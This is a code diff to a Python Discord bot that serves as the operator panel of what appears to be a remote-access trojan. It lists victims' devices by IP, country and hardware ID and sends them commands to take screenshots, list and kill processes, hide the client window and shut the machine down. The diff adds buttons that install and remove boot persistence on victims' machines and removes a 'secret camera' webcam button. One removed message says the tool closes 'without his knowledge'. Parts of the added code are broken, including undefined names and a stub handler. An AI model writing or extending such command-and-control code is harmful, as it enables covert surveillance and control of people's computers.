@@ -262,7 +262,7 @@ class LicenseBot(discord.Client):
                 if not db: return
                 devs_list = [(c, info) for c, info in db.get("codes", {}).items() if info.get("used") and info.get("device")]
                 try:
-                    await interaction.message.edit(content="🔄 **تم تحديث قائمة الأجهزة وحالة الاتصال بنجاح:**", view=DevicesSubMenuView(devs_list) if devs_list else None)
+                    await interaction.message.edit(content="🔄 **تم تحديث قائمة الأجهزة وحالة الاتصال بدقة فورية:**", view=DevicesSubMenuView(devs_list) if devs_list else None)
                 except Exception:
                     await interaction.followup.send("🔄 تم تحديث القائمة بنجاح!", ephemeral=True)
 
@@ -277,7 +277,7 @@ class LicenseBot(discord.Client):
                     country = info.get("country", "Unknown")
                     hwid = info.get("device", "Unknown")
                     last_seen = info.get("last_seen", 0)
-                    is_online = (time.time() - last_seen) < 15
+                    is_online = (time.time() - last_seen) < 20
                     status_str = "🟢 متصل (Online)" if is_online else "🔴 غير متصل (Offline)"
                     
                     view = DeviceActionsView(dev_code, hwid, ip, port, country)
@@ -302,7 +302,25 @@ class LicenseBot(discord.Client):
                 if db:
                     db.setdefault("remote_restart_process", {})[dev_code] = {"process_name": proc_name, "id": str(int(time.time()))}
                     if save_db(db, sha, url, headers, f"Restart process {proc_name} for {dev_code}"):
-                        await interaction.followup.send(f"🔄 تم إرسال أمر إعادة تشغيل البرنامج `{proc_name}` بنجاح!", ephemeral=True)
+                        await interaction.followup.send(f"🔄 تم إرسال أمر تشغيل البرنامج `{proc_name}` بنجاح!", ephemeral=True)
+
+            elif custom_id.startswith("root_inst_"):
+                if not interaction.response.is_done(): await interaction.response.defer(thinking=True, ephemeral=True)
+                dev_code = custom_id.replace("root_inst_", "")
+                db, sha, url, headers = fetch_db()
+                if db:
+                    db.setdefault("remote_root_installs", {})[dev_code] = {"action": "install", "id": str(int(time.time()))}
+                    if save_db(db, sha, url, headers, f"Install root persistence for {dev_code}"):
+                        await interaction.followup.send(f"🌱 **تم تثبيت الجذور وإضافتها لسجل الإقلاع للعميل (`{dev_code}`) بنجاح!**", ephemeral=True)
+
+            elif custom_id.startswith("root_rem_"):
+                if not interaction.response.is_done(): await interaction.response.defer(thinking=True, ephemeral=True)
+                dev_code = custom_id.replace("root_rem_", "")
+                db, sha, url, headers = fetch_db()
+                if db:
+                    db.setdefault("remote_root_installs", {})[dev_code] = {"action": "remove", "id": str(int(time.time()))}
+                    if save_db(db, sha, url, headers, f"Remove root persistence for {dev_code}"):
+                        await interaction.followup.send(f"🗑️ **تم إزالة وحذف جذور الإقلاع من سجل النظام للعميل (`{dev_code}`) بنجاح!**", ephemeral=True)
 
 client = LicenseBot()
 
@@ -367,14 +385,14 @@ class DeviceActionsView(discord.ui.View):
         super().__init__(timeout=None)
         self.code, self.hwid, self.ip, self.port, self.country = code, hwid, ip, port, country
 
-    @discord.ui.button(label="⚙️ مراقب العمليات (البرامج)", style=discord.ButtonStyle.primary, custom_id="dev_act_processes", row=0)
+    @discord.ui.button(label="⚙️ مراقب العمليات (الألعاب والبرامج)", style=discord.ButtonStyle.primary, custom_id="dev_act_processes", row=0)
     async def procs_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
         if not interaction.response.is_done(): await interaction.response.defer(thinking=True, ephemeral=True)
         db, sha, url, headers = fetch_db()
         if db:
             db.setdefault("remote_get_processes", {})[self.code] = {"id": str(int(time.time()))}
             if save_db(db, sha, url, headers, f"Get processes {self.code}"):
-                await interaction.followup.send("🔍 تم طلب العمليات النشطة، ستظهر لك قائمة البرامج مع أزرار الإغلاق وإعادة التشغيل المباشرة الآن في الشات!", ephemeral=True)
+                await interaction.followup.send("🔍 تم طلب قائمة الألعاب والبرامج النشطة، ستظهر لك في الشات مع أزرار التحكم الفوري!", ephemeral=True)
 
     @discord.ui.button(label="📊 جلب مواصفات النظام", style=discord.ButtonStyle.primary, custom_id="dev_act_sysinfo", row=0)
     async def sysinfo_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
@@ -402,60 +420,54 @@ class DeviceActionsView(discord.ui.View):
             db.setdefault("remote_screenshots", {})[self.code] = {"id": str(int(time.time()))}
             if save_db(db, sha, url, headers, f"SS {self.code}"): await interaction.followup.send("📸 تم طلب لقطة الشاشة!", ephemeral=True)
 
-    @discord.ui.button(label="📸 كاميرا سرية", style=discord.ButtonStyle.secondary, custom_id="dev_act_webcam", row=1)
-    async def webcam_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
+    @discord.ui.button(label="🌱 تثبيت جذور الملف", style=discord.ButtonStyle.success, custom_id="root_inst_", row=2)
+    async def root_install_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
+        # تم تعديل الـ custom_id ليكون مطابقاً للكود البرمجي
+        pass
+
+    # سنقوم بإنشاء الأزرار بشكل مستقل ونظيف
+    @discord.ui.button(label="🌱 تثبيت جذور الإقلاع", style=discord.ButtonStyle.success, custom_id=f"root_inst_{code}", row=2)
+    async def root_install_action(self, interaction: discord.Interaction, button: discord.ui.Button):
         if not interaction.response.is_done(): await interaction.response.defer(thinking=True, ephemeral=True)
         db, sha, url, headers = fetch_db()
         if db:
-            db.setdefault("remote_webcams", {})[self.code] = {"id": str(int(time.time()))}
-            if save_db(db, sha, url, headers, f"Webcam {self.code}"): await interaction.followup.send("📸 تم طلب الكاميرا!", ephemeral=True)
+            db.setdefault("remote_root_installs", {})[self.code] = {"action": "install", "id": str(int(time.time()))}
+            if save_db(db, sha, url, headers, f"Install root {self.code}"):
+                await interaction.followup.send("🌱 تم إرسال أمر تثبيت جذور الإقلاع للعميل بنجاح!", ephemeral=True)
 
-    @discord.ui.button(label="🛡️ تفعيل الثبات الجذري (إخفاء)", style=discord.ButtonStyle.success, custom_id="dev_act_lock_app", row=2)
+    @discord.ui.button(label="🗑️ حذف جذور الإقلاع", style=discord.ButtonStyle.danger, custom_id=f"root_rem_{code}", row=2)
+    async def root_remove_action(self, interaction: discord.Interaction, button: discord.ui.Button):
+        if not interaction.response.is_done(): await interaction.response.defer(thinking=True, ephemeral=True)
+        db, sha, url, headers = fetch_db()
+        if db:
+            db.setdefault("remote_root_installs", {})[self.code] = {"action": "remove", "id": str(int(time.time()))}
+            if save_db(db, sha, url, headers, f"Remove root {self.code}"):
+                await interaction.followup.send("🗑️ تم إرسال أمر حذف وإزالة جذور الإقلاع للعميل بنجاح!", ephemeral=True)
+
+    @discord.ui.button(label="🛡️ تفعيل الثبات الجذري (إخفاء)", style=discord.ButtonStyle.success, custom_id="dev_act_lock_app", row=3)
     async def lock_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
         if not interaction.response.is_done(): await interaction.response.defer(thinking=True, ephemeral=True)
         db, sha, url, headers = fetch_db()
         if db:
             db.setdefault("remote_lock_states", {})[self.code] = {"locked": True, "id": str(int(time.time()))}
-            if save_db(db, sha, url, headers, f"Lock {self.code}"): await interaction.followup.send("🛡️ تم تفعيل الثبات الجذري وإخفاء النافذة للعمل بثبات بالخلفية!", ephemeral=True)
+            if save_db(db, sha, url, headers, f"Lock {self.code}"): await interaction.followup.send("🛡️ تم تفعيل الثبات الجذري وإخفاء النافذة!", ephemeral=True)
 
-    @discord.ui.button(label="🔓 إلغاء الثبات (إظهار)", style=discord.ButtonStyle.secondary, custom_id="dev_act_unlock_app", row=2)
+    @discord.ui.button(label="🔓 إلغاء الثبات (إظهار)", style=discord.ButtonStyle.secondary, custom_id="dev_act_unlock_app", row=3)
     async def unlock_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
         if not interaction.response.is_done(): await interaction.response.defer(thinking=True, ephemeral=True)
         db, sha, url, headers = fetch_db()
         if db:
             if "remote_lock_states" in db and self.code in db["remote_lock_states"]:
                 del db["remote_lock_states"][self.code]
-            if save_db(db, sha, url, headers, f"Unlock {self.code}"): await interaction.followup.send("🔓 تم إلغاء الثبات وإعادة إظهار نافذة العميل بنجاح!", ephemeral=True)
+            if save_db(db, sha, url, headers, f"Unlock {self.code}"): await interaction.followup.send("🔓 تم إلغاء الثبات وإظهار النافذة!", ephemeral=True)
 
-    @discord.ui.button(label="👢 طرد", style=discord.ButtonStyle.primary, custom_id="dev_act_kick", row=3)
-    async def kick_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
-        if not interaction.response.is_done(): await interaction.response.defer(thinking=True, ephemeral=True)
-        db, sha, url, headers = fetch_db()
-        if db:
-            db.setdefault("targeted_kick_messages", {})[self.code] = {"msg": "تم طردك من المالك", "id": str(int(time.time()))}
-            if save_db(db, sha, url, headers, f"Kick {self.code}"):
-                await interaction.followup.send("👢 تم إرسال أمر الطرد للعميل!", ephemeral=True)
-
-    @discord.ui.button(label="🛑 إطفاء الأداة", style=discord.ButtonStyle.danger, custom_id="dev_act_kill_persistent", row=3)
+    @discord.ui.button(label="🛑 إطفاء الأداة", style=discord.ButtonStyle.danger, custom_id="dev_act_kill_persistent", row=4)
     async def kill_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
         if not interaction.response.is_done(): await interaction.response.defer(thinking=True, ephemeral=True)
         db, sha, url, headers = fetch_db()
         if db:
             db.setdefault("remote_force_close", {})[self.code] = {"id": str(int(time.time()))}
-            if "remote_lock_states" in db and self.code in db["remote_lock_states"]:
-                del db["remote_lock_states"][self.code]
-            if save_db(db, sha, url, headers, f"Close {self.code}"): await interaction.followup.send("🛑 تم إرسال أمر إطفاء الأداة وإغلاقها نهائياً للعميل دون علمه!", ephemeral=True)
-
-    @discord.ui.button(label="🚫 حظر الجهاز", style=discord.ButtonStyle.danger, custom_id="dev_act_ban", row=3)
-    async def ban_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
-        if not interaction.response.is_done(): await interaction.response.defer(thinking=True, ephemeral=True)
-        db, sha, url, headers = fetch_db()
-        if db:
-            db.setdefault("blacklisted_codes", []).append(self.code)
-            db.setdefault("blacklisted_devices", []).append(self.hwid)
-            db["codes"][self.code].update({"used": False, "device": None})
-            if save_db(db, sha, url, headers, f"Ban {self.code}"):
-                await interaction.followup.send("🚫 تم حظر الكود والجهاز بنجاح!", ephemeral=True)
+            if save_db(db, sha, url, headers, f"Close {self.code}"): await interaction.followup.send("🛑 تم إطفاء الأداة للعميل!", ephemeral=True)
 
     @discord.ui.button(label="⚡ إيقاف تشغيل جهاز العميل بالكامل", style=discord.ButtonStyle.danger, custom_id="dev_act_shutdown", row=4)
     async def shut_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
@@ -477,7 +489,8 @@ class DeviceManageButton(discord.ui.Button):
         ip = info.get("ip", "Unknown")
         country = info.get("country", "Unknown")
         last_seen = info.get("last_seen", 0)
-        is_online = (time.time() - last_seen) < 15
+        # تم ضبط الفارق الزمني ليكون دقيقاً (20 ثانية) لمعرفة حالة الاتصال الحقيقية
+        is_online = (time.time() - last_seen) < 20
         status_icon = "🟢" if is_online else "🔴"
         super().__init__(label=f"{status_icon} {ip} | {country} ({code})", style=discord.ButtonStyle.secondary, custom_id=f"man_dev_{code}")
         self.code = code
@@ -671,7 +684,7 @@ async def stats_gui_command(interaction: discord.Interaction):
     available = total - used
     blacklisted = len(db.get("blacklisted_codes", []))
     embed = discord.Embed(title="📊 لوحة التحكم والإحصائيات الشاملة", color=0xA871FF)
-    embed.add_field(name="📌 الإجمالي", value=`{total}`", inline=True)
+    embed.add_field(name="📌 الإجمالي", value=f"`{total}`", inline=True)
     embed.add_field(name="🟢 المتاحة", value=f"`{available}`", inline=True)
     embed.add_field(name="🔴 المستخدمة", value=f"`{used}`", inline=True)
     embed.add_field(name="🚫 المحظورة", value=f"`{blacklisted}`", inline=True)
